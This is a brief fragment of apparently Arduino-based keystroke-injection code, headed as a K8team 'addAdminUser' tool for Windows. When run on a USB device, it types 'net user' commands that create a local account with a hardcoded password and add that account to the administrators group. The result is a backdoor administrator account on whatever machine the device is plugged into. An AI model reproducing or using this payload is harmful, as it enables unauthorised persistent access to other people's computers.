//win addAdminUser by k8team 2015.4.9 fix 5.15
int myKeyBreak = 50;
...
void setup() {
  ...
  delay(myKeyBreak);
  ascii_println("echo Welcome to K8team!");
  delay(myKeyBreak);
  ascii_println("net user k8gege k8gege520 /add");
  delay(myKeyBreak);
  ascii_println("net localgroup administrators k8gege /add");
  delay(myKeyBreak);
